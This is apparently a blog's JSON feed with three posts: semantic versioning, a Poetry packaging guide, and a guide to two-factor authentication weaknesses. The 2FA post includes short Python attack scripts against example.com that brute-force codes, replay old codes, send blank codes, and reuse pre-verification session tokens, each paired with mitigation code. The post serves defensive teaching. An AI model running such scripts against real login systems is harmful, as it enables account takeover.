{"title":"Ian's Archives","description":"","language":"en","link":"http://iaaaannn0.com","webMaster":"Ian","pubDate":"Wed, 05 Feb 2025 19:23:00 GMT","lastBuildDate":"Wed, 05 Feb 2025 19:25:20 GMT","generator":"hexo-generator-json-feed","items":[{"title":"Semantic Versioning for GitHub Releases","link":"http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/","description":"What is Semantic Versioning (SemVer)?Semantic Versioning (SemVer) is a widely adopted standard for naming software versions. It follows this format: 1MAJOR.MINOR.PATCH For example: 1v1.0.0 Each part of the version number has a specific meaning: MAJOR: Significant changes that break backward compatibility. MINOR: New features that are backward compatible. PATCH: Bug fixes and small improvements that do not change functionality. Examples of Stable Releases: Version Description v1.0.0 First stable release v1.1.0 Adds new features, backward compatible v1.1.1 Bug fix release, backward compatible v2.0.0 Breaking changes introduced Pre-release Versions (Testing Versions)Before an official stable release, you may want to publish a pre-release version for testing purposes. These versions contain experimental features or improvements that need validation. Naming Format for Pre-release Versions:1MAJOR.MINOR.PATCH-identifier.version Identifier Meaning -alpha Internal testing version (unstable) -beta Public testing version (feature-complete but may contain bugs) -rc Release Candidate (nearly stable, final testing) -snapshot Nightly or in-development snapshot Examples of Pre-release Versions: Version Description v1.0.0-alpha.1 First alpha version (internal testing) v1.0.0-beta.2 Second beta version (public testing) v1.0.0-rc.1 First release candidate v1.0.0 Final stable version Other Naming ConventionsIn some cases, you might want to add metadata or build information to the version number. Version Description v1.0.0+build20240205 Includes build metadata (doesn’t affect version sorting) v1.0.0-dev Development version v1.0.0-nightly Nightly build version","pubDate":"Wed, 05 Feb 2025 19:23:00 GMT","guid":"http://iaaaannn0.com/2025/02/06/Semantic-Versioning-for-GitHub-Releases/","category":["releases"]},{"title":"From Setup to Exploitation - A Comprehensive Guide to 2FA Weaknesses","link":"http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/","description":"Description of 2FA VulnerabilitiesTwo-Factor Authentication (2FA) is a critical security feature used to provide an additional layer of protection beyond a username and password. However, vulnerabilities in the implementation, setup, or management of 2FA can undermine its effectiveness. 2FA Setup&#x2F;Implementation1. 2FA Secret Cannot Be RotatedIn many systems, once a 2FA secret (e.g., a key or QR code) is generated, it cannot be rotated or updated. This becomes a problem if the secret is ever exposed, as it leaves the account permanently vulnerable. Impact: If the 2FA secret is compromised, the attacker gains long-term access without the user being able to recover. Solution: Always provide users with the option to securely rotate their 2FA secret. Implement a mechanism to invalidate old secrets and ensure the new one is immediately effective. 2. 2FA Secret Remains Obtainable After 2FA Is EnabledA common issue is leaving the 2FA secret accessible after the initial setup. If a user’s QR code or secret key is stored insecurely or remains visible in the user interface, attackers can retrieve it even after 2FA has been enabled. Impact: This allows an attacker to bypass 2FA protections by using the exposed secret. Solution: Remove or obfuscate the 2FA secret immediately after it is set up. Ensure secrets are never logged, stored in plaintext, or exposed in server responses. 3. Logic Bugs in 2FA SetupPoorly designed logic in the 2FA setup process can cause unintended consequences, such as locking users out of their accounts or corrupting existing authentication settings. For example, systems that allow enabling 2FA without proper state validation can create inconsistencies. Impact: Logic errors can cause account damage or allow attackers to exploit weak points in the setup process. Solution: Thoroughly test the 2FA setup process for edge cases, such as interrupted sessions, invalid requests, and duplicated operations. Use state validation mechanisms to prevent unintended behavior. 4. Previously Created Sessions Remain Valid After 2FA ActivationWhen a user enables 2FA, all active sessions should be invalidated. However, many systems fail to do this, leaving old sessions operational. This can allow attackers with access to an existing session to bypass the new 2FA requirement. Impact: Attackers with access to an active session can continue to operate without being prompted for 2FA. Solution: Automatically terminate all active sessions when 2FA is enabled. Notify users of the session termination and give them control over managing active sessions. 5. Enabling 2FA Without Email VerificationSome systems allow users to enable 2FA without verifying their email or identity. This is problematic because attackers who have gained access to an account could enable and misuse 2FA, making it difficult for the legitimate user to regain control. Impact: Attackers can establish control over an account’s 2FA without proper verification, locking out the legitimate user. Solution: Enforce email or identity verification before allowing users to enable 2FA. This ensures only authorized users can modify security settings. 6. IDOR Vulnerabilities Leading to Account TakeoverInsecure Direct Object References (IDOR) in 2FA-related endpoints can be exploited to modify or access another user’s 2FA settings. For example, attackers could manipulate API requests to enable or disable 2FA for other accounts. Impact: Attackers can take over accounts by altering 2FA settings without authorization. Solution: Implement robust access control mechanisms for all 2FA-related API endpoints. Use user-specific identifiers bound to sessions and validate all requests server-side. 2FA Bypass Vulnerabilities: Detailed Steps and Examples1. 2FA Code Leakage in ResponsesIf 2FA codes are sent in responses from the server to the client, attackers can intercept them using tools like proxies (e.g., Burp Suite) or by monitoring logs. Exploit Steps: Initiate a 2FA login request. Use a proxy to inspect the server’s HTTP response. Look for fields containing the current 2FA code in the JSON or HTML response. Example Response: 12345&#123; &quot;status&quot;: &quot;success&quot;, &quot;2fa_code&quot;: &quot;123456&quot;, &quot;message&quot;: &quot;Verification code sent to your device.&quot;&#125; Attack: By capturing the 2fa_code field, an attacker can bypass the need for real-time code input. Mitigation: Never send 2FA codes or sensitive information in server responses. Use one-time codes that are validated server-side without revealing them to the client. 2. Reusing Old 2FA CodesIf old 2FA codes are not invalidated after generating a new one, attackers can reuse previously intercepted codes. Exploit Steps: Capture a valid 2FA code during a login session. Generate a new 2FA code (e.g., by triggering another login attempt). Use the previously captured code instead of the latest one. Example Exploit Code: 123456789101112import requests# Simulate loginlogin_payload = &#123;&quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;session = requests.Session()response = session.post(&quot;https://example.com/login&quot;, data=login_payload)# Use old codebypass_payload = &#123;&quot;2fa_code&quot;: &quot;123456&quot;&#125; # Old captured codebypass_response = session.post(&quot;https://example.com/verify-2fa&quot;, data=bypass_payload)print(bypass_response.status_code) # Should return 200 if bypassed Mitigation: Immediately invalidate old codes when new codes are generated. Use nonce-based validation to ensure that only the most recent code is valid. 3. Lack of Rate-Limiting (Brute-Force Attack)Without rate limits, attackers can brute-force 2FA codes by rapidly trying all possible combinations (e.g., 000000 to 999999). Exploit Steps: Write a script to automate code guessing. Continuously send requests until the correct code is found. Example Attack Script: 123456789101112import requestsurl = &quot;https://example.com/verify-2fa&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;for code in range(1000000): # 6-digit codes payload = &#123;&quot;2fa_code&quot;: f&quot;&#123;code:06&#125;&quot;&#125; response = requests.post(url, data=payload, headers=headers) if response.status_code == 200: # Success print(f&quot;Code found: &#123;code:06&#125;&quot;) break Mitigation: Enforce rate-limiting (e.g., 5 attempts per minute per IP). Introduce account lockouts or CAPTCHA after repeated failures. 4. Bypassing 2FA with Null or Blank ValuesSome systems improperly validate 2FA codes, allowing null or blank values to bypass authentication. Exploit Steps: Attempt to submit an empty or invalid 2fa_code field. Check if authentication succeeds despite no valid code. Example Exploit: 123456import requestspayload = &#123;&quot;2fa_code&quot;: &quot;&quot;&#125;response = requests.post(&quot;https://example.com/verify-2fa&quot;, data=payload)print(response.status_code) # 200 indicates successful bypass Mitigation: Validate input server-side to reject null, empty, or default values. Use strict validation checks for format and length (e.g., exactly 6 digits). 5. Misconfigured Session PermissionsIf session management is not properly configured, attackers may bypass 2FA by directly accessing authenticated endpoints without completing 2FA verification. Exploit Steps: Intercept the session token after login but before 2FA verification. Use the session token to access authenticated endpoints. Example Exploit: 12345678910import requests# Assume session token is captured before 2FAsession_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;# Access a protected endpointheaders = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;session_token&#125;&quot;&#125;response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)print(response.status_code) # 200 indicates bypass Mitigation: Mark sessions as “partial” until 2FA is completed. Restrict access to sensitive endpoints until full authentication is confirmed. 6. Referrer Check Bypass with Direct RequestsIf 2FA verification relies on referrer headers, attackers can bypass these checks by crafting direct requests. Exploit Steps: Inspect network traffic for referrer-based verification. Send a crafted HTTP request without the expected referrer. Example Exploit: 123456import requestsheaders = &#123;&quot;Referer&quot;: &quot;https://example.com/legitimate-page&quot;&#125;response = requests.post(&quot;https://example.com/verify-2fa&quot;, headers=headers)print(response.status_code) # Should bypass referrer-based restrictions Mitigation: Avoid relying solely on referrer headers for verification. Use session-bound tokens or other mechanisms to validate request authenticity. 7. Using OAuth for 2FA BypassIf 2FA integration with OAuth is poorly configured, attackers can exploit token exchange mechanisms to bypass 2FA. Exploit Steps: Exploit a misconfigured OAuth endpoint to request access tokens without completing 2FA. Use the token to authenticate directly. Example Exploit: 123456789101112import requests# Request token from misconfigured endpointtoken_response = requests.post(&quot;https://example.com/oauth/token&quot;, data=&#123;&quot;grant_type&quot;: &quot;password&quot;, &quot;username&quot;: &quot;victim&quot;, &quot;password&quot;: &quot;password123&quot;&#125;)access_token = token_response.json().get(&quot;access_token&quot;)# Use the token to bypass 2FAheaders = &#123;&quot;Authorization&quot;: f&quot;Bearer &#123;access_token&#125;&quot;&#125;response = requests.get(&quot;https://example.com/protected-endpoint&quot;, headers=headers)print(response.status_code) # 200 indicates bypass Mitigation: Require 2FA completion before issuing access tokens. Validate tokens for proper authentication scope and origin. Additional Vulnerabilities in 2FA Disabling1. Lack of Log AuditingIf 2FA enable&#x2F;disable actions are not logged properly, attackers can disable 2FA without detection, leaving the user and administrators unaware of the breach. Impact: Attackers can disable 2FA stealthily, making accounts vulnerable. Mitigation: Log all 2FA-related actions, including enabling, disabling, and failed attempts. Include details like timestamps, IP addresses, and user-agent strings in the logs. Code Example: 123456789101112def disable_2fa(user_id): # Perform the 2FA disabling logic perform_disable_2fa(user_id) # Log the action log_action( user_id=user_id, action=&quot;2FA Disabled&quot;, ip_address=get_client_ip(), user_agent=get_user_agent(), timestamp=get_current_timestamp() ) 2. Weak Backup Code SecurityBackup codes are often provided for account recovery if the primary 2FA device is unavailable. If these codes are predictable, insufficiently long, or not invalidated after use, attackers can exploit them. Impact: Attackers can guess or steal backup codes to disable 2FA. Mitigation: Generate backup codes with sufficient complexity (e.g., random alphanumeric strings). Automatically invalidate used codes. Require additional verification (e.g., password input) to use backup codes. Code Example: 123456789101112import secretsimport stringdef generate_backup_code(): return &#x27;&#x27;.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))def validate_backup_code(user_id, input_code): stored_code = get_user_backup_code(user_id) if stored_code and input_code == stored_code: invalidate_backup_code(user_id) return True return False 3. Lack of Notification MechanismIf users are not notified when 2FA is disabled, attackers can disable 2FA without the user’s knowledge, leaving accounts exposed. Impact: The legitimate user remains unaware of the security breach. Mitigation: Send real-time notifications (email, SMS, or push) to users whenever 2FA settings are modified. Include information about the device, IP address, and timestamp in the notification. Code Example: 1234567def notify_user(user_id, action): user_email = get_user_email(user_id) send_email( to=user_email, subject=&quot;Security Alert: 2FA Disabled&quot;, message=f&quot;Your 2FA was disabled at &#123;get_current_timestamp()&#125; from IP &#123;get_client_ip()&#125;.&quot; ) 4. Sensitive Operations Lack Additional VerificationSystems often fail to require additional verification (e.g., password input) when disabling 2FA, making it easier for attackers to perform this action if they gain access to the account. Impact: Attackers can easily disable 2FA without the need for additional authentication. Mitigation: Require users to re-enter their password or confirm their identity through another method (e.g., biometric authentication) before disabling 2FA. Code Example: 123456789def verify_password(user_id, input_password): stored_hash = get_user_password_hash(user_id) return check_password_hash(input_password, stored_hash)def disable_2fa_with_verification(user_id, input_password): if verify_password(user_id, input_password): perform_disable_2fa(user_id) else: raise Exception(&quot;Password verification failed.&quot;) 5. Session Token Not Expired After 2FA DisablingIf session tokens are not invalidated after disabling 2FA, attackers can continue using the old session without triggering new authentication. Impact: Attackers with an active session can bypass any changes in authentication settings. Mitigation: Revoke all active sessions after disabling 2FA. Require the user to log in again with updated authentication settings. Code Example: 1234567def revoke_all_sessions(user_id): # Remove all active sessions from the database delete_sessions_for_user(user_id)def disable_2fa(user_id): perform_disable_2fa(user_id) revoke_all_sessions(user_id) 6. CSRF Vulnerabilities in 2FA-Related ActionsCross-Site Request Forgery (CSRF) vulnerabilities can allow attackers to trick authenticated users into disabling 2FA without their knowledge. Impact: Attackers can craft malicious links or forms to disable 2FA on behalf of the user. Mitigation: Use CSRF tokens for all 2FA-related actions. Validate the token server-side for each request. Code Example: 12345678def validate_csrf_token(input_token, session_token): return input_token == session_tokendef disable_2fa(request, user_id): csrf_token = request.get(&quot;csrf_token&quot;) if not validate_csrf_token(csrf_token, get_session_csrf_token(user_id)): raise Exception(&quot;CSRF token validation failed.&quot;) perform_disable_2fa(user_id) 7. Misuse of Developer Debug ModesIn some cases, debug modes allow bypassing 2FA for testing purposes. If left enabled in production, attackers can exploit these debug features. Impact: Attackers can completely bypass 2FA protections. Mitigation: Ensure debug modes are disabled in production builds. Implement runtime checks to verify that debug flags are not present. Code Example: 1234567def ensure_debug_mode_disabled(): if is_debug_mode(): raise Exception(&quot;Debug mode is enabled in production!&quot;)def perform_sensitive_action(): ensure_debug_mode_disabled() # Proceed with action 8. Poorly Configured API PermissionsAPIs that allow 2FA disabling may not properly restrict access. Attackers can exploit misconfigured permissions to disable 2FA via APIs. Impact: Attackers can send unauthorized API requests to disable 2FA. Mitigation: Implement strict authentication and authorization checks for API endpoints. Require API requests to be signed and session-bound. Code Example: 12345def disable_2fa_api(request, user_id): api_token = request.headers.get(&quot;Authorization&quot;) if not validate_api_token(api_token, user_id): raise Exception(&quot;Invalid API token.&quot;) perform_disable_2fa(user_id)","pubDate":"Wed, 05 Feb 2025 12:17:16 GMT","guid":"http://iaaaannn0.com/2025/02/05/From-Setup-to-Exploitation-A-Comprehensive-Guide-to-2FA-Weaknesses/","category":["vuls"]},{"title":"A Comprehensive Guide to Managing Python Projects with Poetry","link":"http://iaaaannn0.com/2025/01/30/poetry/","description":"Poetry is a powerful dependency management and packaging tool for Python. It provides a seamless workflow for managing dependencies, creating virtual environments, and packaging applications. This guide will walk you through the essential features of Poetry, including how to generate a requirements.txt file for compatibility with pip. 1. Installing Poetry To install Poetry, run the following command: 1curl -sSL https://install.python-poetry.org | python3 - After installation, ensure Poetry is available in your terminal by checking its version: 1poetry --version If the command does not work, add Poetry to your PATH: 1export PATH=&quot;$HOME/.local/bin:$PATH&quot; 2. Creating a New Poetry Project To create a new Python project with Poetry, use: 1poetry new my_project This command sets up a basic Python package structure: 123456my_project/├── pyproject.toml # Configuration file for Poetry├── README.rst├── my_project/ # Project source code│ └── __init__.py└── tests/ # Test files If you already have a project and want to initialize Poetry within it, navigate to the project directory and run: 1poetry init This will guide you through setting up pyproject.toml interactively. 3. Managing Dependencies Adding Dependencies To install a package and automatically update pyproject.toml and poetry.lock, use: 1poetry add requests For a development-only dependency: 1poetry add --dev pytest Removing Dependencies To remove a package: 1poetry remove requests Updating Dependencies To update all dependencies: 1poetry update To update a specific package: 1poetry update requests 4. Virtual Environments and Running Code Poetry automatically manages a virtual environment for your project. You can activate it with: 1poetry shell To run a Python script within the virtual environment without activating the shell: 1poetry run python script.py To check the virtual environment being used: 1poetry env info 5. Exporting Requirements for pip Poetry does not use requirements.txt natively, but you can export dependencies for environments that require it (e.g., Docker, CI/CD pipelines). 6. Install the Poetry Export Plugin Poetry 2.0+ requires an additional plugin to export dependencies: 1poetry self add poetry-plugin-export 7. Generate requirements.txt Run the following command to export dependencies: 1poetry export -f requirements.txt --output requirements.txt --without-hashes If you need to include development dependencies: 1poetry export -f requirements.txt --output requirements.txt --without-hashes --with dev You can then install these dependencies using pip: 1pip install -r requirements.txt 8. Version Management To check the current project version: 1poetry version To update the version: 123poetry version patch # Increases 1.0.0 -&gt; 1.0.1poetry version minor # Increases 1.0.0 -&gt; 1.1.0poetry version major # Increases 1.0.0 -&gt; 2.0.0 9. Publishing to PyPI To publish your package to PyPI, first build it: 1poetry build Then publish it: 1poetry publish To publish to TestPyPI for testing: 1poetry publish --repository testpypi Conclusion Poetry simplifies dependency management, virtual environments, and packaging for Python projects. By using Poetry, you can ensure a more reliable and consistent development workflow. With the ability to export requirements.txt, Poetry remains compatible with traditional Python workflows while providing a modern alternative to pip and virtualenv. Start using Poetry today to streamline your Python project management! 🚀","pubDate":"Thu, 30 Jan 2025 04:09:36 GMT","guid":"http://iaaaannn0.com/2025/01/30/poetry/","category":["poetry"]}]}